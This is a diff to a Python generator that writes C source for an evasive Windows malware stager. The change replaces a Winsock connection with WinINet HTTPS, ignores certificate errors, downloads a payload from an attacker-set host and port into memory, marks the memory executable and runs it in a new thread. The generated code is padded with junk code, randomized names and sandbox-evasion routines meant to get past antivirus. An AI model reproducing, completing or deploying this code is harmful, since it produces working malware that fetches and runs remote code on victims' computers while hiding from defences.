@@ -35,29 +35,37 @@ Lport = sys.argv[2]
 
 SpawnMultiProc = int(sys.argv[3])
 
-Randpointer1 = varname_creator()
+Randlpv = varname_creator()
 
-Randpointer2 = varname_creator()
+Randpointer = varname_creator()
 
-Randbuff = varname_creator()
+Randhandle = varname_creator()
 
-Randbuffer2 = varname_creator()
+Randthread = varname_creator()
+
+RandhInternet = varname_creator()
+
+RandhConnect = varname_creator()
+
+RandhRequest = varname_creator()
+
+RandwFlags = varname_creator()
+
+RandISOResult = varname_creator() 
+
+RandisSend = varname_creator()
+
+RandwByteRead = varname_creator()
+
+RandisRead = varname_creator()
+
+Randresult = varname_creator()
+
+Ndcvirtualpro = varname_creator()
+
+Oldprot = varname_creator()
 
 Randbool = varname_creator()
-
-Randflag = varname_creator()
-
-Randflag2 = varname_creator()
-
-Randversion = varname_creator()
-
-Randwsadata = varname_creator()
-
-RandRevtarget = varname_creator()
-
-Randsock = varname_creator()
-
-RandSocket = varname_creator()
 
 Randint = varname_creator()
 
@@ -148,10 +156,8 @@ WinEvasion_07 = windows_evasion()
 WinEvasion_08 = windows_evasion()
 WinEvasion_09 = windows_evasion()
 
-
 Hollow_code = ""
 
-Hollow_code += "#include <winsock2.h>\n"
 
 Include_List = ["#include <stdlib.h>\n","#include <windows.h>\n","#include <stdio.h>\n","#include <string.h>\n","#include <time.h>\n","#include <math.h>\n"]
 
@@ -160,6 +166,8 @@ shuffle(Include_List)
 for i in range(0,len(Include_List)):
 
     Hollow_code += Include_List[i]
+
+Hollow_code += "#include <wininet.h>\n"
 
 Proto_List = [def_func1 + def_func2,fake_func1,fake_func2]
 
@@ -185,49 +193,38 @@ Hollow_code += WinEvasion_08
 Hollow_code += WinEvasion_09
 Hollow_code += Junkcode_05
 Hollow_code += spawn_multiple_process(SpawnMultiProc)
-Hollow_code += "char * " + Randpointer1 + ";\n"
-Hollow_code += "WORD " + Randversion + " = MAKEWORD(2,2);WSADATA " + Randwsadata + ";\n"
-Hollow_code += fake_funcname1 + "();\n"
-Hollow_code += Junkcode_06
-Hollow_code += "if (WSAStartup(" + Randversion + ", &" + Randwsadata + ") < 0){\n"
-Hollow_code += Junkcode_07
-Hollow_code += "WSACleanup();exit(1);}\n"
-Hollow_code += "struct hostent * " + RandRevtarget + ";struct sockaddr_in " + Randsock + ";SOCKET " + RandSocket + ";\n"
-Hollow_code += "" + RandSocket + " = socket(AF_INET, SOCK_STREAM, 0);\n"
-Hollow_code += Junkcode_08
-Hollow_code += "if (" + RandSocket + " == INVALID_SOCKET){" + Junkcode_09 + " closesocket(" + RandSocket + ");WSACleanup();exit(1);}\n"
-Hollow_code += "" + RandRevtarget + " = gethostbyname(\"" + Lhost + "\");\n"     #Lhost
-Hollow_code += "if (" + RandRevtarget + " == NULL){" + Junkcode_10 + " closesocket(" + RandSocket + ");WSACleanup();exit(1);}\n"
-Hollow_code += "memcpy(&" + Randsock + ".sin_addr.s_addr, " + RandRevtarget + "->h_addr, " + RandRevtarget + "->h_length);\n"
-Hollow_code += Junkcode_11
-Hollow_code += "" + Randsock + ".sin_family = AF_INET;\n"
-Hollow_code += Junkcode_12
-Hollow_code += "" + Randsock + ".sin_port = htons((" + Lport + "));\n"        #Lport
-Hollow_code += fake_funcname2 + "();\n"
-Hollow_code += "if ( connect(" + RandSocket + ", (struct sockaddr *)&" + Randsock + ", sizeof(" + Randsock + ")) ){ " + Junkcode_13 + "closesocket(" + RandSocket + ");WSACleanup();exit(1);}\n"
-Hollow_code += Junkcode_14
-Hollow_code += "char " + Randbuff + "[200];\n"
-Hollow_code += Junkcode_15
-Hollow_code += Junkcode_16
-Hollow_code += Junkcode_17
-Hollow_code += "sprintf(" + Randbuff + ", \"GET /%s HTTP/1.1\\r\\nAccept-Encoding: identity\\r\\nHost: " + Lhost + ":" + Lport + "\\r\\nConnection: close\\r\\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.1; Windows NT\\r\\n\\r\\n\", " + ChecksumFunction + "());\n"
-Hollow_code += "send(" + RandSocket + "," + Randbuff + ", strlen( " + Randbuff + " ),0);\n"
-Hollow_code += "Sleep(300);\n"
-Hollow_code += Randpointer1 + " = VirtualAlloc(0, 1000000, MEM_COMMIT, PAGE_EXECUTE_READWRITE);\n"
-Hollow_code += "char * " + Randpointer2 + " = " + Randpointer1 + ";\n"
-Hollow_code += "int " + RandRecv_int + ";\n"
-Hollow_code += "do {" + RandRecv_int + " = recv(" + RandSocket + ", " + Randpointer2 + ", 1024, 0);\n"
-Hollow_code += Randpointer2 + " += " + RandRecv_int + ";\n"
-Hollow_code += "}while ( " + RandRecv_int + " > 0 );\n"
+Hollow_code += "HANDLE " + Randhandle + "; DWORD " + Randthread + "; DWORD " + Randresult + ";\n"
+Hollow_code += "HINTERNET " + RandhInternet + " = InternetOpenA(\"Mozilla/4.0\", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);\n"
+Hollow_code += "if (" + RandhInternet + " != NULL){\n"
+Hollow_code += "HINTERNET " + RandhConnect + " = InternetConnectA(" + RandhInternet + ", \"" + Lhost + "\"," + Lport + ", NULL,NULL, INTERNET_SERVICE_HTTP, INTERNET_FLAG_SECURE, 1);\n"
+Hollow_code += "if (" + RandhConnect + " != NULL){\n"
+Hollow_code += "HINTERNET " + RandhRequest + " = HttpOpenRequestA(" + RandhConnect + ", \"GET\" ," + ChecksumFunction + "() ,NULL, NULL, 0, 0x80000000 | 0x04000000 | 0x00400000 | 0x00200000 | 0x00000200 | 0x00800000 | 0x00002000 | 0x00001000, 1);\n"
+Hollow_code += "if (" + RandhRequest + "!= NULL){\n"
+Hollow_code += "DWORD " + RandwFlags + " = 0x00002000 | 0x00001000 | 0x00000200 | 0x00000100 | 0x00000080;\n"
+Hollow_code += "BOOL " + RandISOResult + " = InternetSetOption (" + RandhRequest + ",INTERNET_OPTION_SECURITY_FLAGS, &" + RandwFlags + ", sizeof (" + RandwFlags + ") );\n"
+Hollow_code += "LPVOID " + Randlpv + " = VirtualAlloc(0, 1000000, MEM_COMMIT, PAGE_READWRITE);\n"
+Hollow_code += "char * " + Randpointer + " = " + Randlpv + ";\n"
+Hollow_code += "BOOL " + RandisSend + " = HttpSendRequestA(" + RandhRequest + ", NULL, 0, NULL, 0);\n"
+Hollow_code +=  "if (" + RandisSend + "){\n"
+Hollow_code += "DWORD " + RandwByteRead + ";\n"
+Hollow_code += "do{\n"
+Hollow_code += "BOOL " + RandisRead + " = InternetReadFile(" + RandhRequest + "," + Randpointer + ", 1024, &" + RandwByteRead + ");\n"
+Hollow_code += Randpointer + " += " + RandwByteRead + ";\n"
+Hollow_code += "}while(" + RandwByteRead + " > 0);\n"
+Hollow_code += "FARPROC " + Ndcvirtualpro + " = GetProcAddress(GetModuleHandle(\"kernel32.dll\"), \"VirtualProtect\");\n"
+Hollow_code += "DWORD " + Oldprot + ";\n"
+Hollow_code += "BOOL " + Randbool + " = (BOOL)" + Ndcvirtualpro + "(" + Randlpv + ",1000000,0x40,&" + Oldprot + ");\n"
 Hollow_code += Junkcode_18
-Hollow_code += "closesocket(" + RandSocket + "); WSACleanup();\n"
-Hollow_code += "((void (*)())strstr(" + Randpointer1 + ", \"\\r\\n\\r\\n\") + 4)();\n"
+Hollow_code += Randhandle + " = CreateThread(NULL,0,(LPVOID)" + Randlpv + ",NULL,0,&"+ Randthread + ");\n"
+Hollow_code += Junkcode_19
+Hollow_code += Randresult + " = WaitForSingleObject(" + Randhandle + ",-1);\n"
+Hollow_code += "}}}}\n"
 Hollow_code += close_brackets_multiproc(SpawnMultiProc)
 Hollow_code += "}}}}\n"
 Hollow_code += "}else{" + Junkcode_19 + "}\n"
 Hollow_code += "}else{" + Junkcode_20 + "}\n"
 Hollow_code += "}else{" + Junkcode_21 + "}\n"
-Hollow_code += "}else{" + Junkcode_22 + "}\n"
+Hollow_code += "}else{" + Junkcode_22 + "}\n" 
 Hollow_code += "}return 0;}"
 Hollow_code = Hollow_code.encode('utf-8')
 
